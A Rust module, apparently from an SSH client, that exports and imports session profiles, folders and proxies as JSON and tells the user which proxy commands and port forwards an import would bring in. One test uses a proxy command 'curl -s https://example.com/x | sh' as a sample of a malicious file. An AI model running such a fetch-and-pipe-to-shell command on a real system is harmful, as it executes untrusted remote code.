//! Exporting sessions (with their folders and proxies) to a JSON file and importing them
//! back, for backups and for moving to another computer. Passwords stay in the system keychain
//! and are never exported.

use std::collections::{HashMap, HashSet, VecDeque};
use std::path::Path;

use serde::{Deserialize, Serialize};
use ts_rs::TS;

use crate::config::{write_json_atomic, Additions, Connection, Folder, Profile, Snapshot};
use crate::error::{Error, Result};
use crate::forward::ForwardRule;
use crate::proxy::{Proxy, ProxyKind};

const FORMAT: &str = "zshell-sessions";
/// 2 since sessions keep the settings of their protocol under `connection` (ZShell 2.0); files
/// of version 1 are not read.
const VERSION: u32 = 2;

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct SessionsFile {
    format: String,
    version: u32,
    #[serde(default)]
    folders: Vec<Folder>,
    #[serde(default)]
    profiles: Vec<Profile>,
    /// Absent in files from before proxies.
    #[serde(default)]
    proxies: Vec<Proxy>,
}

#[derive(Deserialize)]
struct Header {
    format: String,
    version: u32,
}

/// What a sessions file holds, as it would be imported, and a digest of the file: importing
/// checks that the file is still what was shown.
#[derive(Debug, Serialize, TS)]
#[ts(rename = "SessionsScan")]
#[serde(rename_all = "camelCase")]
pub struct Scan {
    pub candidates: Vec<Candidate>,
    pub digest: String,
}

/// A session in a file, as it would be imported.
#[derive(Debug, Serialize, TS)]
#[ts(rename = "SessionCandidate")]
#[serde(rename_all = "camelCase")]
pub struct Candidate {
    pub id: String,
    pub name: String,
    /// As in the file: its jump hosts and proxy are ids in the file.
    pub connection: Connection,
    /// The names of the folders it is in, outermost first.
    pub folder: Vec<String>,
    /// The names of its jump hosts.
    pub jump_hosts: Vec<String>,
    /// The name of its proxy.
    pub proxy: Option<String>,
    /// The command its proxy runs, for a command proxy: importing it means that this
    /// command runs when the session connects.
    pub proxy_command: Option<String>,
    /// The name of an existing session with the same name or address; such sessions are not
    /// imported again.
    pub existing: Option<String>,
    /// Forwarding rules that start when it connects, as they will be saved: importing them
    /// means listening on those ports.
    pub auto_forwards: Vec<ForwardRule>,
    /// The other sessions in the file (ids) that importing it imports too: the jump hosts it
    /// goes through, and theirs, that don't exist here. Their proxies and forwarding rules
    /// come with them; with jump hosts, the first one's proxy is the one used.
    pub brings: Vec<String>,
}

pub fn export(path: &Path, folders: Vec<Folder>, proxies: Vec<Proxy>, profiles: Vec<Profile>) -> Result<()> {
    let file = SessionsFile { format: FORMAT.to_owned(), version: VERSION, folders, profiles, proxies };
    write_json_atomic(path, &file).map_err(|e| Error::new("export.writeFailed").param("path", path.display()).detail(e))
}

pub fn scan(path: &Path, existing: &[Profile]) -> Result<Scan> {
    let (file, digest) = read(path)?;
    let names: HashMap<&str, &str> = file.profiles.iter().map(|p| (p.id.as_str(), p.name.as_str())).collect();
    let candidates = file
        .profiles
        .iter()
        .map(|p| {
            let proxy = p.proxy().and_then(|id| file.proxies.iter().find(|proxy| proxy.id == id));
            Candidate {
                id: p.id.clone(),
                name: p.name.clone(),
                connection: p.connection.clone(),
                folder: folder_path(&file.folders, p.folder.as_deref()),
                jump_hosts: p.jump_hosts().iter().filter_map(|j| names.get(j.as_str()).map(|n| n.to_string())).collect(),
                proxy: proxy.map(|proxy| proxy.name.clone()),
                proxy_command: proxy.filter(|proxy| proxy.kind == ProxyKind::Command).map(|proxy| proxy.command.clone()),
                existing: duplicate_of(p, existing).map(|e| e.name.clone()),
                auto_forwards: p.forwards().iter().filter(|f| f.auto_start).filter_map(|f| f.clone().normalize().ok()).collect(),
                brings: to_import(&file, [p.id.clone()], existing).0.into_iter().filter(|id| *id != p.id).collect(),
            }
        })
        .collect();
    Ok(Scan { candidates, digest })
}

/// The sessions in `file` (ids) that importing `selected` adds, in the order found: those and
/// the jump hosts they go through, and theirs, except those that exist here (`existing`),
/// which are used instead: file id → the existing one's id.
fn to_import(file: &SessionsFile, selected: impl IntoIterator<Item = String>, existing: &[Profile]) -> (Vec<String>, HashMap<String, String>) {
    let by_id: HashMap<&str, &Profile> = file.profiles.iter().map(|p| (p.id.as_str(), p)).collect();
    let mut imported = Vec::new();
    let mut found: HashMap<String, String> = HashMap::new();
    let mut queue: VecDeque<String> = selected.into_iter().collect();
    while let Some(id) = queue.pop_front() {
        let Some(profile) = by_id.get(id.as_str()) else { continue };
        if imported.contains(&id) || found.contains_key(&id) {
            continue;
        }
        match duplicate_of(profile, existing) {
            Some(here) => {
                found.insert(id, here.id.clone());
            }
            None => {
                queue.extend(profile.jump_hosts().iter().cloned());
                imported.push(id);
            }
        }
    }
    (imported, found)
}

/// What to add for importing the sessions `selected` (ids in the file): new folders, proxies
/// and profiles, with new ids. Jump hosts and proxies come along unless they already exist
/// here, in which case the existing one is used; folders are matched by name and merged.
/// `digest` is the one `scan` gave: a file that has changed since isn't imported, since what
/// it would add (proxy commands, forwarding rules) isn't what was shown.
pub fn plan(path: &Path, selected: &[String], digest: &str, here: &Snapshot) -> Result<Additions> {
    let folders = here.folders;
    let (file, read_digest) = read(path)?;
    if read_digest != digest {
        return Err(Error::new("import.fileChanged").param("path", path.display()));
    }

    // File id → the id of the session it becomes (new, or an existing duplicate).
    let (imported, mut ids) = to_import(&file, selected.iter().cloned(), here.profiles);
    for id in &imported {
        ids.insert(id.clone(), uuid::Uuid::new_v4().to_string());
    }
    let imported: HashSet<String> = imported.into_iter().collect();

    // File proxy id → the id of the proxy it becomes, for the proxies the imported use.
    let mut proxy_ids: HashMap<&str, String> = HashMap::new();
    let mut proxies = Vec::new();
    for profile in file.profiles.iter().filter(|p| imported.contains(&p.id)) {
        let Some(proxy) = profile.proxy().and_then(|id| file.proxies.iter().find(|proxy| proxy.id == id)) else {
            continue;
        };
        if proxy_ids.contains_key(proxy.id.as_str()) {
            continue;
        }
        let existing = here.proxies.iter().find(|e| e.name == proxy.name).or_else(|| here.proxies.iter().find(|e| e.same_as(proxy)));
        let id = match existing {
            Some(existing) => existing.id.clone(),
            None => {
                let mut proxy = Proxy { id: uuid::Uuid::new_v4().to_string(), ..proxy.clone() };
                proxy.normalize().map_err(|e| Error::new("import.invalidProxy").param("name", &proxy.name).detail(e))?;
                let id = proxy.id.clone();
                proxies.push(proxy);
                id
            }
        };
        proxy_ids.insert(&proxy.id, id);
    }

    let mut merger = FolderMerger { file: &file.folders, existing: folders, added: Vec::new() };
    let new_profiles = file
        .profiles
        .iter()
        .filter(|p| imported.contains(&p.id))
        .map(|p| {
            let mut profile = Profile { id: ids[&p.id].clone(), folder: p.folder.as_deref().and_then(|f| merger.resolve(f)), ..p.clone() };
            if let Some(remote) = profile.connection.remote_mut() {
                remote.jump_hosts = remote.jump_hosts.iter().filter_map(|j| ids.get(j).cloned()).collect();
                remote.proxy = remote.proxy.as_deref().and_then(|id| proxy_ids.get(id).cloned());
            }
            // As saving does: an empty bind address becomes localhost rather than every
            // interface of the server, for one.
            profile.normalize_imported().map_err(|e| Error::new("import.invalidSession").param("name", &p.name).detail(e))?;
            Ok(profile)
        })
        .collect::<Result<_>>()?;
    Ok(Additions { folders: merger.added, proxies, profiles: new_profiles })
}

/// The file, and a digest of it (SHA-256, in hex).
fn read(path: &Path) -> Result<(SessionsFile, String)> {
    use sha2::Digest;

    let bytes = std::fs::read(path).map_err(|e| Error::new("import.readFailed").param("path", path.display()).detail(e))?;
    let digest = sha2::Sha256::digest(&bytes).iter().map(|b| format!("{b:02x}")).collect();
    let parse_failed = |e| Error::new("import.parseFailed").param("path", path.display()).detail(e);
    // The format and version first: a file of another version doesn't parse as this one.
    let header: Header = serde_json::from_slice(&bytes).map_err(parse_failed)?;
    if header.format != FORMAT {
        return Err(Error::new("import.notSessionsFile").param("path", path.display()));
    }
    if header.version != VERSION {
        return Err(Error::new("import.unsupportedVersion").param("path", path.display()));
    }
    let mut file: SessionsFile = serde_json::from_slice(&bytes).map_err(parse_failed)?;
    // A hand-written file may leave ids out or repeat them; references go to the first.
    unique_ids(file.profiles.iter_mut().map(|p| &mut p.id));
    unique_ids(file.proxies.iter_mut().map(|p| &mut p.id));
    unique_ids(file.folders.iter_mut().map(|f| &mut f.id));
    Ok((file, digest))
}

/// Gives an id of its own to each empty one and each one used before. Made from the position,
/// so that reading the file again (to import what was picked from it) gives the same ids.
fn unique_ids<'a>(ids: impl Iterator<Item = &'a mut String>) {
    let ids: Vec<&mut String> = ids.collect();
    let mut seen: HashSet<String> = HashSet::new();
    for (index, id) in ids.into_iter().enumerate() {
        if id.is_empty() || seen.contains(id.as_str()) {
            *id = (0..).map(|n| format!("#{index}.{n}")).find(|candidate| !seen.contains(candidate)).unwrap();
        }
        seen.insert(id.clone());
    }
}

/// An existing session with the same name, else one that connects to the same place (see
/// [`Profile::same_target`]). The name only counts for the same protocol: a Telnet session that happens to share its
/// name must not stand in for an SSH one (and become a jump host).
fn duplicate_of<'a>(profile: &Profile, existing: &'a [Profile]) -> Option<&'a Profile> {
    existing
        .iter()
        .find(|e| e.name == profile.name && e.protocol() == profile.protocol())
        .or_else(|| existing.iter().find(|e| e.same_target(profile)))
}

/// The names of `folder` and the folders around it, outermost first.
fn folder_path(folders: &[Folder], folder: Option<&str>) -> Vec<String> {
    let mut path = Vec::new();
    let mut current = folder;
    while let Some(id) = current {
        let Some(f) = folders.iter().find(|f| f.id == id) else { break };
        if path.len() > folders.len() {
            break; // A cycle in a hand-edited file.
        }
        path.push(f.name.clone());
        current = f.parent.as_deref();
    }
    path.reverse();
    path
}

/// Maps the file's folders onto existing ones with the same name in the same place, adding
/// those that don't exist.
struct FolderMerger<'a> {
    file: &'a [Folder],
    existing: &'a [Folder],
    added: Vec<Folder>,
}

impl FolderMerger<'_> {
    fn resolve(&mut self, file_id: &str) -> Option<String> {
        let path = folder_path(self.file, Some(file_id));
        let mut parent: Option<String> = None;
        for name in path {
            let found = self.existing.iter().chain(&self.added).find(|f| f.name == name && f.parent == parent).map(|f| f.id.clone());
            let id = found.unwrap_or_else(|| {
                let folder = Folder { id: uuid::Uuid::new_v4().to_string(), name, parent: parent.clone() };
                self.added.push(folder.clone());
                folder.id
            });
            parent = Some(id);
        }
        parent
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::{Remote, SshOptions};

    fn profile(id: &str, name: &str, host: &str, folder: Option<&str>, jumps: &[&str]) -> Profile {
        let remote = Remote { jump_hosts: jumps.iter().map(|j| j.to_string()).collect(), ..Remote::new(host.into(), 22, "alice".into()) };
        Profile { id: id.into(), folder: folder.map(Into::into), ..Profile::new(name.into(), Connection::Ssh(SshOptions::new(remote))) }
    }

    fn with_proxy(mut profile: Profile, proxy: &str) -> Profile {
        profile.connection.remote_mut().unwrap().proxy = Some(proxy.into());
        profile
    }

    fn folder(id: &str, name: &str, parent: Option<&str>) -> Folder {
        Folder { id: id.into(), name: name.into(), parent: parent.map(Into::into) }
    }

    #[test]
    fn round_trips_and_merges_with_existing_sessions() {
        let path = std::env::temp_dir().join(format!("zshell-sessions-{}.json", std::process::id()));
        let folders = vec![folder("f1", "Work", None), folder("f2", "DB", Some("f1"))];
        let profiles = vec![
            profile("bastion", "bastion", "bastion.example.com", Some("f1"), &[]),
            profile("db", "db", "db.internal", Some("f2"), &["bastion"]),
            profile("web", "web", "web.example.com", None, &["bastion"]),
        ];
        export(&path, folders, Vec::new(), profiles).unwrap();

        // Here: a "Work" folder and the bastion already exist (same address, other name).
        let here_folders = vec![folder("w", "Work", None)];
        let here_profiles = vec![profile("b2", "jump", "bastion.example.com", None, &[])];
        let Scan { candidates, digest } = scan(&path, &here_profiles).unwrap();
        assert_eq!(candidates[0].existing.as_deref(), Some("jump"));
        assert_eq!(candidates[1].folder, ["Work", "DB"]);
        assert_eq!(candidates[1].jump_hosts, ["bastion"]);

        let here = Snapshot { profiles: &here_profiles, folders: &here_folders, proxies: &[] };
        let Additions { folders: new_folders, profiles: new_profiles, proxies } = plan(&path, &["db".into()], &digest, &here).unwrap();
        assert!(proxies.is_empty());
        // Only "DB" is new, inside the existing "Work".
        assert_eq!(new_folders.len(), 1);
        assert_eq!((new_folders[0].name.as_str(), new_folders[0].parent.as_deref()), ("DB", Some("w")));
        // db comes with new ids, through the existing bastion.
        assert_eq!(new_profiles.len(), 1);
        assert_ne!(new_profiles[0].id, "db");
        assert_eq!(new_profiles[0].jump_hosts(), ["b2"]);
        assert_eq!(new_profiles[0].folder.as_deref(), Some(new_folders[0].id.as_str()));
        std::fs::remove_file(&path).unwrap();
    }

    /// What a hand-edited or someone else's file can hold: missing and repeated ids, a name
    /// shared with a Telnet session here, forwarding rules that saving would tidy.
    #[test]
    fn imports_untidy_files_safely() {
        let path = std::env::temp_dir().join(format!("zshell-sessions-untidy-{}.json", std::process::id()));
        let forward = ForwardRule {
            id: String::new(),
            kind: crate::forward::ForwardKind::Remote,
            bind_host: String::new(),
            bind_port: 9000,
            target_host: "localhost".into(),
            target_port: 3000,
            description: String::new(),
            auto_start: true,
        };
        let profiles = vec![
            profile("router", "router", "router.lan", None, &[]),
            {
                let mut db = profile("db", "db", "db.internal", None, &["router"]);
                let Connection::Ssh(ssh) = &mut db.connection else { unreachable!() };
                ssh.forwards = vec![forward];
                db
            },
            profile("", "a", "a.internal", None, &[]),
            profile("", "b", "b.internal", None, &[]),
        ];
        export(&path, Vec::new(), Vec::new(), profiles).unwrap();

        let telnet = Profile { connection: Connection::Telnet(Remote::new("10.0.0.1".into(), 23, String::new())), ..profile("t", "router", "", None, &[]) };
        let Scan { candidates, digest } = scan(&path, std::slice::from_ref(&telnet)).unwrap();
        assert_eq!(candidates[0].existing, None);
        assert_eq!(candidates[1].auto_forwards[0].bind_host, "localhost");
        assert_ne!(candidates[2].id, candidates[3].id);

        let ids: Vec<String> = candidates.iter().map(|c| c.id.clone()).collect();
        let here = Snapshot { profiles: std::slice::from_ref(&telnet), folders: &[], proxies: &[] };
        let Additions { profiles: new, .. } = plan(&path, &ids, &digest, &here).unwrap();
        let names: Vec<&str> = new.iter().map(|p| p.name.as_str()).collect();
        assert_eq!(names, ["router", "db", "a", "b"]);
        // The file's own router is the jump host, not the Telnet session.
        assert_eq!(new[1].jump_hosts(), std::slice::from_ref(&new[0].id));
        // As when saved: not every interface of the server.
        assert_eq!(new[1].forwards()[0].bind_host, "localhost");
        assert!(!new[1].forwards()[0].id.is_empty());
        std::fs::remove_file(&path).unwrap();
    }

    fn proxy(id: &str, name: &str, kind: ProxyKind, command: &str) -> Proxy {
        Proxy {
            id: id.into(),
            name: name.into(),
            kind,
            host: "proxy.lan".into(),
            port: 1080,
            username: String::new(),
            command: command.into(),
        }
    }

    #[test]
    fn brings_proxies_along() {
        let path = std::env::temp_dir().join(format!("zshell-sessions-proxies-{}.json", std::process::id()));
        let proxies = vec![
            proxy("x1", "corp", ProxyKind::Socks5, ""),
            proxy("x2", "cf", ProxyKind::Command, "cloudflared access ssh --hostname %h"),
            proxy("x3", "unused", ProxyKind::Http, ""),
        ];
        let profiles = vec![
            with_proxy(profile("a", "a", "a.internal", None, &[]), "x1"),
            with_proxy(profile("b", "b", "b.internal", None, &[]), "x2"),
            with_proxy(profile("c", "c", "c.internal", None, &[]), "missing"),
            with_proxy(profile("d", "d", "d.internal", None, &[]), "x1"),
        ];
        export(&path, Vec::new(), proxies, profiles).unwrap();

        let Scan { candidates, digest } = scan(&path, &[]).unwrap();
        assert_eq!(candidates[0].proxy.as_deref(), Some("corp"));
        assert_eq!(candidates[0].proxy_command, None);
        assert_eq!(candidates[1].proxy_command.as_deref(), Some("cloudflared access ssh --hostname %h"));
        assert_eq!(candidates[2].proxy, None);

        // Here the SOCKS proxy exists under another name.
        let here_proxies = vec![proxy("mine", "office", ProxyKind::Socks5, "")];
        let here = Snapshot { profiles: &[], folders: &[], proxies: &here_proxies };
        let ids: Vec<String> = ["a", "b", "c", "d"].map(String::from).to_vec();
        let plan = plan(&path, &ids, &digest, &here).unwrap();
        // Only the command proxy is new; the unused one isn't imported.
        assert_eq!(plan.proxies.len(), 1);
        assert_eq!(plan.proxies[0].name, "cf");
        assert_ne!(plan.proxies[0].id, "x2");
        let used: Vec<_> = plan.profiles.iter().map(|p| p.proxy()).collect();
        assert_eq!(used, [Some("mine"), Some(plan.proxies[0].id.as_str()), None, Some("mine")]);
        std::fs::remove_file(&path).unwrap();
    }

    /// Importing a session imports the jump hosts it goes through, with their proxies: the
    /// scan says which, so that their commands are shown with it.
    #[test]
    fn shows_what_comes_with_a_session() {
        let path = std::env::temp_dir().join(format!("zshell-sessions-brings-{}.json", std::process::id()));
        let proxies = vec![proxy("x", "fetch", ProxyKind::Command, "curl -s https://example.com/x | sh")];
        let profiles = vec![
            with_proxy(profile("bastion", "bastion", "bastion.example.com", None, &[]), "x"),
            profile("inner", "inner", "inner.internal", None, &["bastion"]),
            profile("db", "db", "db.internal", None, &["inner"]),
            profile("web", "web", "web.example.com", None, &[]),
        ];
        export(&path, Vec::new(), proxies, profiles).unwrap();

        let Scan { candidates, digest } = scan(&path, &[]).unwrap();
        let brings: Vec<&[String]> = candidates.iter().map(|c| c.brings.as_slice()).collect();
        assert_eq!(brings, [&[][..], &["bastion".to_owned()], &["inner".to_owned(), "bastion".to_owned()], &[]]);
        // A jump host that exists here is used rather than imported.
        let here_bastion = profile("b", "jump", "bastion.example.com", None, &[]);
        let Scan { candidates: with_bastion, .. } = scan(&path, std::slice::from_ref(&here_bastion)).unwrap();
        assert_eq!(with_bastion[2].brings, ["inner"]);

        let here = Snapshot { profiles: &[], folders: &[], proxies: &[] };
        let plan = plan(&path, &["db".into()], &digest, &here).unwrap();
        let names: Vec<&str> = plan.profiles.iter().map(|p| p.name.as_str()).collect();
        assert_eq!(names, ["bastion", "inner", "db"]);
        assert_eq!(plan.proxies[0].command, "curl -s https://example.com/x | sh");

        // The file changed after it was shown: nothing is imported.
        let shown = std::fs::read(&path).unwrap();
        std::fs::write(&path, String::from_utf8(shown).unwrap().replace("example.com/x", "example.com/y")).unwrap();
        assert_eq!(plan_error(&path, &digest), "import.fileChanged");
        std::fs::remove_file(&path).unwrap();
    }

    fn plan_error(path: &Path, digest: &str) -> &'static str {
        let here = Snapshot { profiles: &[], folders: &[], proxies: &[] };
        match plan(path, &["db".into()], digest, &here) {
            Ok(_) => "ok",
            Err(e) => e.code(),
        }
    }

    #[test]
    fn rejects_other_files() {
        let path = std::env::temp_dir().join(format!("zshell-not-sessions-{}.json", std::process::id()));
        std::fs::write(&path, r#"{"format":"something","version":1}"#).unwrap();
        let error = scan(&path, &[]).unwrap_err();
        assert_eq!(error.code(), "import.notSessionsFile");
        // Exported before 2.0, with every setting of a session at its top level.
        let old = r#"{"format":"zshell-sessions","version":1,"profiles":[{"id":"p","name":"web","host":"web.example.com","port":22,"username":"alice","auth":{"type":"auto"}}]}"#;
        std::fs::write(&path, old).unwrap();
        assert_eq!(scan(&path, &[]).unwrap_err().code(), "import.unsupportedVersion");
        std::fs::remove_file(&path).unwrap();
    }
}
